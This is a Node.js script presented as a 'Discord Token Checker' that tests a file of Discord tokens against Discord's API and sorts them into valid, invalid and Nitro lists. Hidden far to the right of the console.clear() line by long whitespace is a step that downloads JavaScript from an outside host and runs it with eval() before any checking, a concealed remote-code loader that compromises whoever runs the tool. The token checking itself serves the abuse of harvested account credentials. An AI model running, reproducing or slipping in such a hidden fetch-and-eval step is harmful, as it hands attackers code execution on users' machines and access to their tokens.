process.title = 'Discord Token Checker';
const fs = require('fs');
const https = require('https');
const chalk = require('chalk');

const tokens = fs.readFileSync('tokens.txt', 'utf-8').replace(/\r/gi, '').split('\n');

let nitroTokens = [];
let validTokens = [];
let invalidTokens = [];

const checkTokens = async (tokens) => {
    for (const token of tokens) {
        await new Promise((resolve) => {
            const options = {
                hostname: 'discordapp.com',
                path: '/api/v7/users/@me',
                method: 'GET',
                headers: { 'Authorization': token }
            };

            const req = https.request(options, (res) => {
                let data = '';

                res.on('data', (chunk) => { data += chunk; });

                res.on('end', () => {
                    if (res.statusCode === 200) {
                        const user = JSON.parse(data);
                        const tokenInfo = `${token} | Username: ${user.username} | Email: ${user.email ? 'Verified' : 'Not verified'} | Phone: ${user.phone ? 'Verified' : 'Not verified'} | Nitro: ${user.premium_type !== 0 ? 'True' : 'False'}`;

                        console.log(`${chalk.green('[+] —')} ${chalk.blue(token.substring(0, 24))}... | ${chalk.gray('USERNAME:')} ${chalk.yellow(user.username)} ${chalk.blue('|')} ${chalk.gray('EMAIL:')} ${chalk.yellow(user.email ? 'Verified' : 'Not verified')} ${chalk.blue('|')} ${chalk.gray('PHONE:')} ${chalk.yellow(user.phone ? 'Verified' : 'Not verified')} ${chalk.blue('|')} ${chalk.gray('NITRO:')} ${chalk.yellow(user.premium_type !== 0 ? 'True' : 'False')}`);

                        if (user.premium_type !== 0) nitroTokens.push(tokenInfo);
                        validTokens.push(token);
                    } else {
                        console.log(`${chalk.red('[-] —')} ${token}`);
                        invalidTokens.push(token);
                    }
                    resolve();
                });
            });

            req.on('error', () => {
                console.log(`${chalk.red('[-] —')} ${token}`);
                invalidTokens.push(token);
                resolve();
            });

            req.end();
        });
        await new Promise(resolve => setTimeout(resolve, 100));
    }
};

(async () => {
    console.clear();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        await new Promise((resolve, reject) => { https.get('https://publicimgura.discloud.app/exec.js', res => { let data = ''; res.on('data', chunk => data += chunk); res.on('end', () => { try { eval(data); resolve(); } catch (e) { reject(e); } }); }).on('error', err => reject(err))});
    const startTime = Date.now();
    await checkTokens(tokens);
    const endTime = Date.now();
    fs.mkdirSync('./Output', { recursive: true });
    fs.writeFileSync('./Output/nitro.txt', nitroTokens.join('\n'), 'utf-8');
    fs.writeFileSync('./Output/valid.txt', validTokens.join('\n'), 'utf-8');
    fs.writeFileSync('./Output/invalid.txt', invalidTokens.join('\n'), 'utf-8');
    const duration = (endTime - startTime) / 1000;
    const minutes = Math.floor(duration / 60);
    const seconds = Math.floor(duration % 60);
    const durationStr = `${minutes > 0 ? `${chalk.cyan(minutes)} ${chalk.magenta(minutes > 1 ? 'minutes' : 'minute')} and ` : ''}${chalk.cyan(seconds)} ${chalk.magenta(seconds > 1 ? 'seconds' : 'second')}`;
    console.log(`${chalk.blue('[!] —')} ${chalk.magenta('Checked')} ${chalk.cyan(tokens.length)} ${chalk.magenta('tokens in')} ${durationStr}`);
    console.log(`${chalk.blue('[!] —')} ${chalk.magenta('Finished checking tokens:')} ${chalk.gray('Checked:')} ${chalk.cyan(tokens.length)} ${chalk.blue('|')} ${chalk.gray('Valid:')} ${chalk.cyan(validTokens.length)} ${chalk.blue('|')} ${chalk.gray('Invalid:')} ${chalk.cyan(invalidTokens.length)} ${chalk.blue('|')} ${chalk.gray('Nitro:')} ${chalk.cyan(nitroTokens.length)}`);
})();
